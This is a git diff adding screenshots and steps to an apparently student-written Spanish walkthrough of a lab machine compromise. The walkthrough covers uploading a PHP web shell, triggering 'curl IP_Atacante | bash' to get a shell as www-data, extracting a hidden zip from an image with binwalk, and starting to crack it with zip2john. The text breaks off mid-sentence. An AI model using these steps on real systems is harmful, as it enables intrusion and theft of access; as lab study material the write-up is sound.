@@ -204,15 +204,40 @@ Tendra que subir un archivo php para ejecutar comandos desde la web.
 
 La maquina atacante tendra lo siguiente:
 
-- Un archivo html con codigo bash dento, y en la misma ruta del archivo abrir .
-- Un terminal abierto para ponernos en escucha en http.
+- Un archivo html con codigo bash dento, y en la misma ruta del archivo abrir un terminal con lo siguiente, para iniciar un servidor web en la maquina atacante.
 
-Una vez tenemos esto en la maquina atacante, desde la web ponemos la ruta del archivo que hemos subido con el codigo php para hacer comandos, y añadimos ?cmd=curl IP_Atacante | bash.
+  ![image](https://github.com/Dani-ITB24/Proyecto-Final/assets/157145186/04bff278-aade-47fc-9fab-a15f5a87b7eb)
+
+- Un terminal abierto para ponernos en escucha en http.
+  
+  ![image](https://github.com/Dani-ITB24/Proyecto-Final/assets/157145186/bcb607a2-b054-43bb-8726-999ae8719b34)
+
+
+Una vez tenemos esto en la maquina atacante, desde la web ponemos la ruta del archivo que hemos subido con el codigo php para hacer comandos, y añadimos ?cmd=curl IP_Atacante | bash, se quedara la pagina pensando.
+
+![image](https://github.com/Dani-ITB24/Proyecto-Final/assets/157145186/98c2016d-2b16-4637-b2de-9cb3e59ed2c1)
+
 Y en el terminal atacante podemos observar que nos hemos registrado como www-data.
+
+![image](https://github.com/Dani-ITB24/Proyecto-Final/assets/157145186/10a24d5e-d24d-470c-bf91-abfa8bbd7af7)
 
 Dentro de este usuario encontramos que no podemos acceder a ningun archivo con privilegios, pero obserbamos que hay un usuario llamado Caroline.
 Y en el directorio /etc encontramos una imaghen de carolina la cual si la descargamos a la maquina local y le hacemos un binwalk vemos que tiene un zip dentro.
 
+![image](https://github.com/Dani-ITB24/Proyecto-Final/assets/157145186/f7c96f07-1548-4f95-a17f-7c4541b04aed)
+
+Para extraer este zip ponemos binwalk -e carolina.jpg, y nos crea una carpeta con el zip.
+
+![image](https://github.com/Dani-ITB24/Proyecto-Final/assets/157145186/cbafc43e-0b8f-4cfa-a3e2-2ddaeae11bf6)
 
 
+Al intentar extraerlo nos damos cuenta que tiene contraseña.
 
+![image](https://github.com/Dani-ITB24/Proyecto-Final/assets/157145186/63bec0e4-7179-4ddc-913d-92cfd4727ef8)
+
+
+Por eso el atacante tendra que usar zip2jhon para sacar el hash de este zip.
+
+![image](https://github.com/Dani-ITB24/Proyecto-Final/assets/157145186/4bc0cfa5-8cd2-4729-9c48-a7c9f34f3b82)
+
+Y con el hash 
